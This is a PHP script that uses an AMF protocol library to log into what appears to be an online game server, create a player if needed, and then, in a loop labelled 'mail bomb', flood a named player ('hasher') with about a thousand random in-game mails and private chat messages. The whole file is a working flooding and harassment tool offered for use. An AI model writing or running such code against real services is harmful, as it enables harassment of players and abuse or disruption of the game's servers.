<?php

include('Socket/Server.php');
include('Socket/Client.php');
require_once( 'amfphp/core/amf/app/Gateway.php');
require_once( AMFPHP_BASE . 'amf/io/AMFSerializer.php');
require_once( AMFPHP_BASE . 'amf/io/AMFDeserializer.php');
require_once('YaBOB/AMF.php');
require_once('YaBOB/Login.php');
require_once('YaBOB/Handshake.php');

require_once('YaBOB/common/Createnewplayer.php');
require_once('YaBOB/common/Privatechat.php');
require_once('YaBOB/Mail/Sendmail.php');
require_once('config.php');

$s = new Socket\Client($address,$port);

echo 'Writing to ',$address,':',$port,PHP_EOL;

$AMF = NEW YaBOB_AMF();
$amfHandshake = NEW YaBOB_Handshake();
$amfLogin = NEW YaBOB_Login();

$loginInfo = $amfLogin->_($acc_email,$acc_password); unset($amfLogin);
$loginData = $AMF->AMFlength($loginInfo).$loginInfo;

$s->write($amfHandshake); unset($amfHandshake);
$s->write($loginData);

echo 'Getting response!',PHP_EOL;


$in = $s->read();
while($in){
	$out = @$out.$in;
	$in = @$s->read();
	//if (strpos($in, "\n") !== false) break;
}



echo 'Got response!',PHP_EOL;
$out = substr($out, 4);

$response = $AMF->destructAMF($out);

if(@$response->data['msg'] === "login success")
	echo 'server returned: '.$response->data['msg']."\n";
else if(@$response->data['errorMsg'] === "need create player"){
	$createplayer = NEW YaBOB_Common_Createnewplayer();
	$player = $createplayer->_("Packet", '','','','');
	$createplayer = $AMF->AMFlength($player).$player;
	$s->write($createplayer);
	$in = $s->read();
	//var_dump($in);
} else {
	echo 'server returned: '.$response->data['errorMsg'];
	exit;
}
//$s->read();
	//var_dump($response);



$mail = NEW YaBOB_Mail_Sendmail();
$chat = NEW YaBOB_Common_Privatechat();
echo "Starting mail bomb\n";

for($i = 0; $i <=1000; $i++)
{
	$message = bin2hex(mcrypt_create_iv(50));
	$mailMessage = $mail->_($message, "hasher", "Hello");
	$chatMessage = $chat->_("hasher","//pause ".$message);
	$mailData = $AMF->AMFlength($mailMessage).$mailMessage;
	$chatData = $AMF->AMFlength($chatMessage).$chatMessage;
	$s->write($mailData);
	$s->write($chatData);
	$out = $s->read();
	$out = substr($out, 4);
	$out = $AMF->destructAMF($out);
	echo "Sent ".$i." mails\n";
}
//var_dump($out);